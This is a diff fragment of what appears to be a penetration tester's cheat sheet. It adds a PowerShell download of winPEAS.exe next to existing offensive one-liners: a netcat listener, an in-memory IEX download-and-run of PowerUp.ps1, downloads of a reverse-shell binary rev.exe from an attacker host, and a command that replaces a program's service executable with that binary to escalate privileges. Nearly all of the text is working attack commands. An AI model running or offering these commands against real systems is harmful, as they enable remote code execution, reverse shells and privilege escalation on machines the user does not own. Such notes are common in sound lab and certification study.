@@ -10,6 +10,7 @@ copy \\192.168.162.46\share\*
 
 ---------------------
 nc -nvlp 80
+PS> Invoke-WebRequest "http://192.168.162.46/winPEAS.exe" -OutFile winPEAS.exe 
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.162.46/PowerUp.ps1')
 powershell.exe (New-Object System.Net.WebClient).Downloadfile('http://192.168.162.46/rev.exe','rev.exe')
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/rev.exe', 'C:\Program Files\Bad App\App.exe')"
